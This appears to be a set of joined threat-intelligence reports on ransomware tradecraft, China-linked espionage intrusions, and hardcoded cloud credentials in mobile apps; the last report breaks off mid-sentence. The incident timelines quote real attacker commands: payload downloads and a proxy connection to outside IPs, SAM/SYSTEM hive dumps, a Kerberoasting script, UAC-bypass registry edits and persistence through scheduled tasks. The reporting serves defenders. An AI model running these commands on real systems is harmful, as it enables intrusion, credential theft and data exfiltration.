2025. Ransomware actors continue to use a huge array of TTPs to carry out ransomware attacks. Attackers use these TTPs to gain access to and spread across victim networks, drop payloads, steal credentials, exfiltrate data, and turn off security software to prevent their activity from being discovered. While ransomware families may come and go, TTPs tend to change less frequently, with minor evolutions occurring and attackers learning from other successful attacks. A huge proportion of tools used by attackers is legitimate software. Malware tends to be deployed sparingly and may only appear at the conclusion of an attack (such as when a ransomware payload is deployed). Two key things ransomware attackers leveraged living-off-the-land tools for in 2024 were data exfiltration and disabling security software. Exfiltrating data is a huge part of ransomware attacks now, with almost all attacks now involving double extortion, where attackers exfiltrate data from a victim’s network before encrypting it, to increase the pressure on victims to pay a ransom demand. The vast majority of tools used for data exfiltration are dual use—legitimate software used by the attackers for malicious purposes. Among the tools we see attackers use for data exfiltration are familiar names like PowerShell, Remote Desktop Protocol (RDP), Cobalt Strike, and WinRAR. Another popular choice is Rclone, anopen-source toolthat can legitimately be used to manage content in the cloud but has been seen being abused by ransomware actors to exfiltrate data from victim machines. However, one of the most popular types of legitimate software used by ransomware attackers is remote access/remote desktop and remote monitoring and management (RMM) software. Attackers can use this software, which has many legitimate purposes, for a wide range of activities, including issuing commands and dropping payloads, but the exfiltration of data from victim machines is one of the main ways they leverage this type of software during ransomware attacks. Legitimate remote access software used by attackers include: AnyDesk: Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. AnyDesk has been used extensively in pre-ransomware activity that has led to the deployment of ransomware, including AvosLocker, Monster, Noberus (aka BlackCat), BlackByte, and Lunamoth. Atera:Atera has legitimate uses as an RMM tool and can monitor the performance and health of Windows and Mac devices, printers, servers, routers, and more. It is used by attackers for remote access and has been seen being used to download Rclone from the cloud so that it could likely be used to exfiltrate data. It has also been observed being used alongside other remote access tools including ScreenConnect. Atera has been used in attack chains that have led to the deployment of ransomware, including Lunamoth, BlueSky, Ransom Cartel, Conti, and Royal. ScreenConnect (formerly ConnectWise):Aremote desktop application tool by ConnectWisethat is used to enable remote access to computers. It can legitimately be used for remote monitoring and management, backup and disaster recovery, and more. It has been used alongside ransomware, including Royal, AvosLocker, Noberus, and Yanluowang. Splashtop: A family of legitimate remote desktop and remote support software developed bySplashtop Inc. Enables users to remotely access computers from desktop and mobile devices. TeamViewer: A legitimateremote access and collaboration application. It and similar tools are often used by attackers to obtain remote access to computers on a network. A common tactic frequently deployed by ransomware attackers at present is the impairment of defenses, usually by attempting to disable antivirus (AV) or endpoint detection and response (EDR) products. The use of impairment techniques and tools has risen markedly among ransomware actors over the past two years, most likely in response to vendors improving their ability to identify patterns of malicious activity that occur prior to ransomware deployment. Attackers have been seen leveraging living-off-the-land techniques to disable security software, such as using Windows utilities to disable Windows Defender. However, by far the most frequently used technique for defense impairment is the BYOVD technique. Attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software. Since drivers operate with kernel access, they can terminate processes, making them an effective tool for disrupting security measures. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. These drivers are considered “vulnerable” as it should not be possible to leverage them in this way. BYOVD is popular with attackers due to its effectiveness and reliance on legitimate, signed files, which are less likely to raise red flags. A wide range of drivers have been used in such attacks, with anti-rootkit drivers developed by security vendors being frequently among the most commonly exploited. The most frequently used BYOVD tools seen in the past two years include: TrueSightKiller: Apublicly available toolthat leverages a vulnerable driver named truesight.sys. The signed driver was originally developed to be used in RogueKiller Anti-Malware, developed by Adlice Software. Gmer: Arootkit scannerthat can be used to kill processes. Warp AVKiller: A variant of a Go-based information-stealing threat called Warp Stealer, which appears to be just used to bypass security products. It uses a vulnerable Avira anti-rootkit driver to disable security products. KillAV: Malware used to deploy various vulnerable drivers for terminating security processes. GhostDriver: Apublicly available toolthat leverages vulnerable drivers to kill processes. Poortry (aka BurntCigar): A malicious driverdocumented by Sophosthat is frequently employed alongside a loader known as Stonestop. Unlike many drivers, Poortry may have been developed by attackers who then succeeded in getting it signed. AuKill: A tooldocumented by Sophosthat uses an outdated version of the driver used bythe Microsoft utility Process Explorerto disable EDR processes. It seems certain that ransomware will remain one of the main cybercrime threats in 2025. Attackers’ ability to pivot their activity to evade detection, coupled with the emergence of new threats when law enforcement disrupts existing operations, means that tackling ransomware is likely to remain a major challenge for business, government, security vendors, and law enforcement for some time to come.

    "text": "Tools that are usually associated with China-based espionage actors were recently deployed in an attack involving the RA World ransomware against an Asian software and services company. During the attack in late 2024, the attacker deployed a distinct toolset that had previously been used by a China-linked actor in classic espionage attacks. While tools associated with China-based espionage groups are often shared resources, many aren’t publicly available and aren’t usually associated with cybercrime activity. In all the prior intrusions involving the toolset, the attacker appeared to be engaged in classic espionage, seemingly solely interested in maintaining a persistent presence on the targeted organizations by installing backdoors. In July 2024, an attacker compromised the Foreign Ministry of a country in southeastern Europe. The attacker leveraged a legitimate Toshiba executable named toshdpdb.exe to sideload a malicious DLL named toshdpapi.dll. This DLL acts as a loader for a heavily obfuscated payload that is contained in a file called TosHdp.dat. The payload is encrypted with the RC4 decryption key: 20240120@@@. Analysis of the decrypted payload revealed that it is a variant of PlugX (aka Korplug), a custom backdoor that is not publicly available malware and is only associated with China-linked espionage actors. To date, it has never been used by actors based in other countries. Features of this variant included encrypted strings, dynamic API resolution, and control flow flattening. Its configuration was encrypted using the RC4 key qwedfgx202211. The PlugX plugins compilation timestamps for this variant were identical to those in theThor PlugX variant, documented by Palo Alto, which was linked to Fireant (aka Mustang Panda, Earth Preta), a China-based espionage group. The variant also has some similarities to thePlugX type 2 variant documented by Trend Micro, which has also been linked to Fireant. The configuration was encrypted using the same RC4 key (qwedfgx202211), and both variants had similar configuration structures. Further espionage attacks involving the same PlugX variant followed. In August 2024, the attacker compromised the government of another southeastern European country. Also in August 2024, the attacker compromised a government ministry in a Southeast Asian country. In September 2024, they briefly compromised a telecoms operator in the region, and in January 2025, the attacker targeted a government ministry in another Southeast Asian country. In the midst of these apparent espionage attacks, in late November 2024, the same toolset was used in connection with a criminal extortion campaign against a medium-sized software and services company in South Asia. While no infection vector was found, the attacker later claimed that the target’s network was compromised by exploiting a known vulnerability in Palo Alto’s PAN-OS (CVE-2024-0012) firewall software. The attacker then said administrative credentials were obtained from the company’s intranet before stealing Amazon S3 cloud credentials from its Veeam server, using them to steal data from its S3 buckets before encrypting computers. The attacker leveraged the same Toshiba executable (toshdpdb.exe) to sideload the malicious DLL named toshdpapi.dll. This DLL acts as a loader, and when executed, it searches for a file named toshdp.dat in the current folder and decrypts it. The decrypted payload from the toshdp.dat file is the same PlugX variant observed in the prior espionage attacks. Machines on the target’s network were encrypted with the RA World ransomware. The attacker demanded a $2 million ransom, which would be reduced to $1 million if paid within three days. There is evidence to suggest that this attacker may have been involved in ransomware for some time. In a report on RA World attacks, Palo Alto said that it had found some links to Bronze Starlight (aka Emperor Dragonfly), a China-based actor that deploys different ransomware payloads. One of the tools used in this ransomware attack was a proxy tool called NPS, which was created by a China-based developer. This has previously beenused by Bronze Starlight. SentinelOne, meanwhile, reportedthat Bronze Starlight had been involved in attacks involving the LockFile, AtomSilo, NightSky, and LockBit ransomware families. It is unclear why an actor who appears to be linked to espionage operations is also mounting a ransomware attack. While this is not unusual for North Korean threat actors to engage in financially motivated attacks to subsidize their operations, there is no similar history for China-based espionage threat actors, and there is no obvious reason why they would pursue this strategy. Another possibility is that the ransomware was used to cover up evidence of the intrusion or act as a decoy to draw attention away from the true nature of the espionage attacks. However, the ransomware deployment was not very effective at covering up the tools used in the intrusion, particularly those linking it back to prior espionage attacks. Secondly, the ransomware target was not a strategically significant organization and was something of an outlier compared to the espionage targets. It seems unusual that the attacker would go to such lengths to cover up the nature of their campaign. Finally, the attacker seemed to be serious about collecting a ransom from the victim and appeared to have spent time corresponding with them. This usually wouldn’t be the case if the ransomware attack was simply a diversion. The most likely scenario is that an actor, possibly one individual, was attempting to make some money on the side using their employer’s toolkit.

    "text": "Threat actors using tools linked to China-based APT groups have targeted multiple high-profile organizations in Southeast Asia, including government ministries in two different countries, an air traffic control organization, a telecoms company, and a media outlet. The attacks, which have been underway since at least October 2023, appear to have intelligence gathering as their main goal. The attackers use a variety of both open-source and living-off-the-land tools in their operations. While attribution to a specific threat group cannot be determined, multiple tools used in the campaign have links to several China-based actors (see Tools section for details). Of note is the use of a proxy tool called Rakshasa and a legitimate application file used for DLL sideloading, both of which wereused previously by the Chinese advanced persistent threat (APT) group known as Earth Baku(aka APT41, Brass Typhoon). A typical attack involves the use of a remote access tool that leverages Impacket to execute commands via WMI (Windows Management Instrumentation). The attackers then install keyloggers, password collectors, and reverse proxy tools (Rakshasa, Stowaway, ReverseSSH) to maintain connections to attacker-controlled infrastructure. The threat actors also install customized DLL files that act as authentication mechanism filters, allowing them to intercept login credentials. The threat actors used the following tools. However, the list of tools used in each attack varied and not all of the following were used in every attack. Dismap:An open-sourceasset discovery and identification tool. FastReverseProxy:FRP is an open-sourced toolused to expose local servers to the public internet. file.io exfiltration:Commands used by the attackers suggests data gathered during a successful attack is exfiltrated to the legitimate file-sharing website file.io. Impacket:An open-sourcecollection of moduleswritten in Python for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. Infostealer:An information-collection tool that creates a hidden folder named AppCache and file named AppCache.dat in C:\\Users\\[CURRENT USER]\\AppData\\Local\\Microsoft\\Windows\\AppCache\\AppCache.dat. It then encrypts and logs gathered information into AppCache.dat. Inveigh:A cross-platform . NET IPv4/IPv6machine-in-the-middle toolfor penetration testers. The tool can be used to conduct spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. Keylogger:The attackers install customized DLL files that act as authentication mechanism filters, effectively allowing them to intercept login credentials from users who physically log in to the machine. Legitimate applications abused for DLL sideloading:The attackers used a legitimate application file (Bitdefender Crash Handler) from 2011 for DLL sideloading. This file wasused previouslyin multiple attacks, some of which werelinked tothe Chinese APT group known as Earth Baku (aka APT41, Brass Typhoon). Living off the land:The attackers also made use of several living-off-the-land tools, including: NBTScan:An open-source command-lineNetBIOS scanner. PlugX (Korplug):A remote access Trojan (RAT) that can download additional plugins to enhance its capability beyond information gathering. The malware was initially associated solely with multiple Chinese state-backed threat actors, including Budworm (aka APT27, Emissary Panda, Lucky Mouse) and Fireant (aka Mustang Panda, APT31, Stately Taurus). However, a range of other threat actors outside of China have used the malware since its source code was allegedly leaked in 2015. Rakshasa:A proxy tool written in Go, designed specifically for multi-level proxying and internal network penetration. The tool has beenused previously by Earth Baku. In addition, the language used in the tool is simplified Chinese. ReverseSSH:A statically linkedSSH serverwith reverse shell functionality. SharpGPOAbuse:A. NET applicationwritten in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. SharpNBTScan:A NetBIOSscanning toolwritten in C#. The tool wasused previouslyby the China-linked APT group known as Fireant (aka Mustang Panda, APT31, Stately Taurus). Stowaway Proxy Tool:Apublicly available multi-hop proxy toolthat allows users to easily proxy their network traffic to intranet nodes. TightVNC:Open-sourceremote desktop software. WinRAR:Anarchive managerthat can be used to archive or zip files – for example, prior to exfiltration. The following activity occurred on one of the targeted organizations’ networks. In this instance, the attackers remained active for at least three months, between June and August 2024, focusing on intelligence gathering—specifically collecting and likely exfiltrating data of interest. While this case highlights a particular approach, in other attacks, the threat actors employed additional tactics, techniques, and procedures (TTPs), such as DLL sideloading, and leveraged tools like Rakshasa and SharpGPOAbuse, among others, to achieve their objectives. The first indication of malicious activity within this organization was on May 27 at 14:15 local time, where a suspicious PowerShell command was executed. The command was used to modify the registry, specifically the system policies, to enable 'LocalAccountTokenFilterPolicy'. This value is responsible for controlling how local accounts are filtered when they are used to access a Windows system remotely. By setting the key to value '1', it effectively disables Remote UAC filtering for local accounts, allowing local admin accounts to use elevated tokens (with full admin rights when connecting remotely). At 14:18, another suspicious command was executed via the WMI service: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1716819456.018484 2>&1 This pipe naming convention typically indicates a remote tool leveraging Impacket is being used to execute the commands (also corroborated via process lineage). This is a common command observed as part of tooling used in lateral movement such as wmiexec. At 14:22, several additional discovery commands were executed: These commands were used to display wireless network profile information, including network names for any wireless network that was connected to in the past. The net share command lists any available network shares. The netstat command lists all active (established and listening) TCP connections on the machine. The next day on May 28 at 12:51, another suspicious command was executed via WMI: cmd.exe /Q /c move ChromeUpdate.dat ChromeUpdate.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716900555.2954416 2>&1 The command was used to rename a likely uploaded file called ChromeUpdate.dat (SHA-256: 8b6d081be732743aa6f6bccfb68b3f21878aa36723c1311f50406d752aacc9fa) to ChromeUpdate.exe. Next, the file was executed, passing ‘install' as a command-line argument: ChromeUpdate.exe /install The file contained an encrypted embedded keylogger payload for 64-bit systems. At 13:07, several suspicious registry edits and scheduled task-related commands were executed: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun These commands were used to create a run key for a file called mscorsvw.exe in the registry using the run key name 'mscorsvc' – this will launch the file every time the system boots. The schtasks command creates a scheduled task called 'autorun' under the user '[REMOVED]' and is configured to run only once at 23:59 on the same day. Directly after this, schtasks was executed to launch the autorun (i.e. mscorsvw.exe) task. At 13:13, another scheduled task was created for a different file: schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_SYSTEMX86\\wbem\\wintulxs.exe -c 38.60.146.78:443 -s 1qaz2wsx4rfv -reconnect 10\" /F This task was scheduled to run once at 23:59 on the same day using the task name 'autorun' to execute a file called 'wintulxs.exe' (SHA-256: d312b0e1968beae5a2ff3be2d8efc6d1bfdab3b1aec6faf8eafa295c47230194). This tool is a freely available Chinese proxy tool calledStowaway, which is described as providing the ability to “proxy external traffic through multiple nodes to the core internal network, breaking through internal network access restrictions.” On May 30 at 03:16, the attackers returned and executed a series of ‘net’ commands to list network share sessions and available shares, and to view available shares on remote hosts. The attackers also mounted network shares. Directly afterwards, the ‘fsutil’ command was executed to list all available file system drives (e.g. C:). net view \\\\192.168.21.65 net use [REMOVED]\\\\192.168.21.108/u:[REMOVED] net use [REMOVED]/d/y net use [REMOVED]\\\\192.168.21.61/u:[REMOVED] At the time of the initial attacker activity on May 27 at 13:41, additional suspicious activity was also observed on another machine. Similar commands to those previously observed were executed as a means to bypass UAC. This time, the commands were executed via TightVNC. reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f net localgroup [REMOVED] [REMOVED] /add reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f At 15:08, another suspicious reg.exe command was executed: \"CSIDL_SYSTEM\\reg.exe\" add \"hklm\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v [REMOVED] /t REG_DWORD /d 0 /f This command was used to modify the Windows registry, specifically to hide a specific account from displaying in the user list during user login. Shortly after at 15:10, the attackers returned and dumped passwords from the registry: cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 reg save hklm\\sam sam.hive reg save hklm\\system system.hive cmd.exe /Q /c dir /on CSIDL_PROGRAM_FILES\\winrar\\rar.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 The attackers also checked that WinRAR was installed in the default path, likely using it to collect and later exfiltrate the hive files. On May 28 at 13:51, the attackers used WMI to launch a command prompt. The next day at13:52, the attackers returned and copied an unknown file that masquerades as part of the . NET framework. CSIDL_WINDOWS\\microsoft.net\\framework\\v4.0.30319\\mscorsvw.exe → CSIDL_SYSTEM_DRIVE\\progra~2\\microsoft.net\\redistlist\\mscorsvw.exe. Directly after this, the attackers proceeded to create registry run keys and scheduled a task to execute the sample at 23:59: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun Finally, the attackers used schtasks to launch the autorun service, executing mscorsvw.exe. Later, on August 20, the attackers installed a ReverseSSH tool – winupdateser.exe (SHA-256: 779b4a5f53d3128ab53dd8e13c362d6d077c3eb4987f878d7ef3416c801ef0dd). Following this, at 07:32, the attackers created a scheduled task on a remote system to execute an unknown Windows batch file (net.bat) at 15:35 using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance': schtasks /create /s [REMOVED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_SYSTEM\\net.bat\" /sc once /st 15:35 Shortly afterward, WMI was used to execute ‘ChromeUpdate.exe /install’ in order to install a keylogger. At 08:11, WMI was used to execute ‘ipconfig /all >> %TEMP%\\cc.dat’ to collect network configuration information. On September 4, the attackers returned and created multiple scheduled tasks to execute unknown Windows batch files using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance' on multiple machines: schtasks /create /s [REDACTED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_WINDOWS\\temp\\[REDACTED]udpate.bat\" /sc once /st 15:58 On August 6 at 12:21, the attackers accessed another machine where they executed a script (ime.bat) in order to install a new authentication mechanism called Win32Pro. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos /v Auth0 /t REG_SZ /d \"Win32Pro\" /f >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\" >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" >>c:\\windows\\ime\\ime.log Following the installation, the attackers launched a file named ‘win32pro.dll’ (SHA-256: 89707a5bf9862a9effb1618a1a285a8d027fb343f6103f4bc68f736889f0a86e) via another file called rpc2.exe (SHA-256: e0f3b8028a2969e280efdd770978a54181fc242dd26cbf0a22e922f1e6a1b951). CSIDL_SYSTEM\\rpc2.exe CSIDL_SYSTEM\\win32pro.dll The file ‘win32pro.dll’ was used to capture and collect user login information including the current time, domain name, username, machine name, and password. Captured credentials were stored in the following locations using the RC4 encryption algorithm with the key \"rfvfsj\": During the course of these operations, the attackers conducted exfiltration activities within targeted organizations. They maintained prolonged access to these networks, often spanning several months, while operating covertly to avoid detection. During this time, they focused on harvesting credentials, including passwords, and mapping the network to identify systems of interest. Exfiltration was carried out through a combination of tactics, including the collection of files of interest using WinRAR, which were subsequently compressed into password-protected archives. These archives were then uploaded to cloud storage services such as File.io, enabling the attackers to stealthily exfiltrate sensitive data while minimizing the risk of exposure. This extended dwell time and calculated approach underscore the sophistication and persistence of the threat actors.

Tools leveraged in these attacks have been used by Chinese state-backed groups such as Fireant (aka Mustang Panda, APT31, Stately Taurus), Earth Baku (aka APT41, Brass Typhoon), Budworm (aka APT27, Emissary Panda, Lucky Mouse), and others. However, due to many of these groups frequently sharing tools and using similar TTPs, specific attribution in this case is not possible.

    "text": "A large U. S. organization with a significant presence in China was the subject of a targeted attack earlier this year, during which the attackers obtained a persistent presence on its network, seemingly for the purpose of intelligence gathering. The attack was likely carried out by a China-based threat actor, since some of the tools used in this attack have been previously associated with Chinese attackers. While it is possible that actual network intrusion occurred earlier, the first evidence of the attacker’s activity dates from April 2024, and this malicious activity continued until August 2024. The attackers moved laterally across the organization’s network, compromising multiple computers. Some of the machines targeted were Exchange Servers, suggesting the attackers were gathering intelligence by harvesting emails. Exfiltration tools were also deployed, suggesting that targeted data was taken from the organizations. DLL-sideloading:The attackers used several legitimate applications to load malware, a technique known as DLL-sideloading, where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload. In this case, several Google and Apple applications were used to perform sideloading (GoogleToolbarNotifier.exe and iTunesHelper.exe). Impacket: An open-sourcecollection of moduleswritten in Python, a general purpose programming language, for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. FileZilla: Anopen-source FTP client and serveravailable for Windows, Linux, and macOS. PSCP: ASecure Copy Protocol (SCP) clientcreated by the same developers as the PuTTY SSH client. Living off the land:The attackers also leveraged several living-off-the-land tools, including: The initial infection vector remains unknown. However, the first evidence of malicious activity dates from April 11, 2024, when a suspicious command was executed on one computer via WMI, which bore the hallmarks of a tool leveraging Impacket from another machine on the network:cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 The fact that the command originated from another machine on the network suggests that the attackers had already compromised at least one other machine on the organization’s network and that the intrusion may have begun prior to April 11. The attackers then attempted to mount a network share using the “net use” command. Next, they dumped credentials from the registry using reg.exe: reg save hklm\\system ss A minute later, they attempted to mount another network share, using the “net use” command, specifically attempting to mount a drive connected to a network attached storage (NAS) device. A few hours later, the attackers returned and ran netstat to check for all open TCP (active and listening) connections. The attackers then executed another encoded PowerShell script, which decoded as: $ProgressPreference=\"SilentlyContinue\";setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList $_. Context. PostContext[0]. Trim() } The command queries Active Directory (AD) for service principal names (SPNs), which are accounts associated with services within the AD. The command then processes the output to extract relevant details and then extracts a Kerberos security token for each matching SPN. This is a tactic called Kerberoasting and is used to steal credentials specifically for service accounts, which the attackers likely attempt to crack offline in an effort to gain access to privileged accounts to assist in moving laterally across the network. It is also interesting to note that the domain specified in the above command “medin.local” is the default domain name used in a number of publicly available Kerberoast tools and scripts, suggesting the attackers are directly leveling off-the-shelf tooling without any modifications. The attackers were then observed modifying some of the commands and executing several further PowerShell commands, this time with the correct domain: $ProgressPreference=“SilentlyContinue”;setspn -T [REMOVED] -Q */* $ProgressPreference=“SilentlyContinue”;klist $ProgressPreference=“SilentlyContinue”;klist tgt The “klist” command lists the current Kerberos tickets for the user, giving visibility into the user's active Kerberos authentication status. Additionally, “tgt” refers to the Ticket Granting Ticket, which is a special type of ticket used to authenticate to the Key Distribution Center (KDC). This is likely targeted by the attackers to obtain other service tickets to attempt to crack offline. On April 16, malicious activity resumed on the same computer when the attackers launched a command prompt via WMI. The next day, they proceeded to execute a file named rc.exe, which is a renamed version of Google’s application GoogleToolbarNotifier. This file was used to sideload a malicious DLL named gtn.dll. Malicious activity began on a second machine, a web server, on June 2, 2024. The attackers again used the change directory command via WMI, with the structure of the command suggesting that Impacket was used: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1717319212.299007 2>&1 Minutes later, the attackers ran a file named putty.exe. Despite the name, the application is actually the SFTP component of FileZilla, which is based on PuTTY’s Secure File Transfer Protocol (SFTP) client. This was likely installed for data exfiltration purposes. On June 13, the same file was executed multiple times via WMI. The next day (June 14), PowerShell was used to download files from a remote host to the perflogs directory: powershell (new-object System. Net. WebClient). DownloadFile( 'hxxp://149.28.154.23:443/rar.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\rar.exe') powershell (new-object System. Net. WebClient). DownloadFile( 'hxxp://149.28.154.23:443/vmtools.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\vmtools.exe') Although not recovered, rar.exe was likely the command-line version of WinRAR. The file named vmtools.exe was a renamed version of PSCP, the Secure Copy Protocol (SCP) client created by the same developers as PuTTY SSH. Malicious activity on this computer resumed on June 27, when a number of commands were executed, mostly via PsExec. Among the files run was the legitimate Google application GoogleUpdate.exe. Among the suspicious files found on this machine were two named ibnettle-6.dll and textinputhost.dat. It is possible that one or both were malicious files that were sideloaded. Textinputhost.dat was previously reported by Sophos and Recorded Future as being used by the Chinese Crimson Palace group in attacks against targets in Southeast Asia. Malicious activity began on a third machine on June 2, when WMI was used to execute wevtutil to query the Windows Event Log from a remote machine on the network: wevtutil qe security /rd:true /f:text /q:”*[System[(EventID=4624) or (EventID=4672) or (EventID=4634) or (EventID=4673) or (EventID=4740)]] and *[System[TimeCreated[timediff(@SystemTime)<=2592000000]]]” The command was structured to query the security event log for the following events: Immediately afterwards, the attackers ran a PowerShell script via WMI: cmd.exe /Q /c powershell echo ((new-object Net. Sockets. TcpClient). Connect(\\”192.168.92.92\\”,135)) “open!” 1> \\\\127.0.0.1\\ADMIN$\\__1717327352.4534295 2>&1 It is possible that the attackers are using this script to test connectivity back to another computer on the network specifically to confirm if Microsoft’s remote procedure call (RPC) service was available (port 135). The attackers also attempted to connect to the same machine using port 3389 (usually reserved for RDP): powershell echo ((new-object Net. Sockets. TcpClient). Connect(\\”192.168.92.92\\”,3389)) “open!” The attackers returned on June 20 and launched a command prompt via PsExec from another machine on the network (192.168.88.235). Several net commands were then executed: CSIDL_SYSTEM\\net1 group “Exchange Servers” /domain The commands are used to display information pertaining to specific groups of the domain. One group the attackers were particularly interested in is \"Exchange Servers\", suggesting the attackers were attempting to target mail servers to collect and possibly exfiltrate email data. Later in the same day, a suspicious PowerShell command was executed via PsExec: powershell -exec bypass -command “Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate|Format-Table -AutoSize |Out-File -FilePath “ CSIDL_COMMON_APPDATA\\computer.txt -Width ([int]::MaxValue)” The command retrieves all enabled computers from Active Directory along with their name, DNS hostname, operating system, and last logon date. It then formats the information into a table and saves it to a file called computer.txt. Minutes later, the quser command was executed to list all logged in/activate user accounts on the machine. The next day (June 21), the machine was used again to launch a command prompt on another machine on the network: PsExec64.exe \\\\192.168.92.79 -accepteula cmd On June 5, a suspicious command was executed on a fourth computer via WMI: reg.exe export “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs” CSIDL_WINDOWS\\temp\\ts_2011.tmp The command exports registry key values to a . TMP file. The registry key Control\\Session Manager\\KnownDLLs holds a list of trusted DLLs that the system typically loads from the System32 directory during system boot-up that may be leveraged by other processes. Exporting this key will copy all the registry values associated with these KnownDLLs and may provide information to the attackers on what file names may appear innocuous if reused or, more likely, for the purposes of DLL hijacking. This is a common attack where malicious DLLs are placed in directories to be loaded instead of legitimate system DLLs. One June 13, activity commenced on a fifth machine when a command was executed via WMI to change the directory to the root drive. The attackers then attempted to launch the application iTunesHelper.exe from the PerfLogs directory. This was likely launched to load a malicious DLL (CoreFoundation.dll) using the sideloading technique (we have seen this done many times before with this same binary using CoreFoundation.dll). The available evidence suggests that the organization was breached by a China-based actor. Aside from the fact that DLL sideloading is a widely favored tactic among Chinese groups, the same organization was targeted in 2023 by an attacker with tentative links to the China-based Daggerfly group. The file textinputhost.dat was previously reported bySophosandRecordedFutureas being leveraged by China-based espionage group Crimson Palace in attacks against Southeast Asia. In that case, it was used in conjunction with an executable named rc.exe. The same file name was also used by the attackers who conducted this attack.

    "text": "Mobile apps have become an essential part of our everyday lives, with millions of apps downloads on platforms like the Google Play Store and Apple App Store, a hidden threat has emerged that could put user data and backend services at significant risk. Recent analysis has uncovered a troubling trend: several widely-used apps have been found to contain hardcoded and unencrypted cloud service credentials within their codebases. This dangerous practice means that anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. In this blog, we will explore specific examples of these vulnerabilities, focusing on apps that have hardcoded Amazon Web Services (AWS) and Microsoft Azure Blob Storage credentials, and discuss best practices that developers should adopt to prevent such issues. The Pic Stitch: Collage Maker app, with over 5 million downloads on the Google Play Store, has been found to contain hardcoded AWS credentials directly within its code, posing a significant security risk. The code snippet from Jadx (Figure. 1-3) reveals that the app uses the method loadAmazonCredential(boolean z) to load the appropriate credentials depending on the environment. If the boolean flag is set to true, the app loads the production credentials, including the production Amazon S3 bucket name, the read and write access keys, and secret keys. Conversely, if the flag is false, the app loads the corresponding staging credentials. Similarly, the same type of insecure credential management has been uncovered in several popular iOS apps (Figure. 4), all of which have embedded hardcoded and unencrypted AWS credentials within their codebases. Three apps in particular—Crumbl,Eureka: Earn Money for Surveys, andVideoshop - Video Editor—exemplify this widespread problem. With over 3.9 million ratings and ranked number 5 in the Food & Drink category on the Apple Store, Crumbl’s code (Figure. 5) initializes an AWSStaticCredentialsProvider with plain-text credentials, including an access key and secret key. These credentials are used to configure AWS services, leaving them exposed and vulnerable to misuse. Furthermore, the inclusion of a WebSocket Secure (WSS) endpoint within the code—\"wss://***.iot.us-west-2.amazonaws.com\"—highlights a significant security oversight. This endpoint, part of the Amazon API URL, is hardcoded with an API Gateway that directly connects to the IoT services on AWS. Exposing such URLs alongside static credentials makes it easier for attackers to potentially intercept or manipulate communications, leading to unauthorized access to the associated AWS resources. This configuration, without proper encryption or obfuscation, presents a serious risk to the integrity of the application and its backend infrastructure. This app, with 402.1K ratings and ranked 61 in the Lifestyle category, hardcodes AWS credentials directly within its code. (Figure. 6) The app allocates an INMAWSCredentials object and initializes it with the access key and secret key, both stored in plain text. These credentials are used to log events to AWS, exposing critical cloud resources to potential attacks. With 357.9K ratings, Videoshop directly embeds 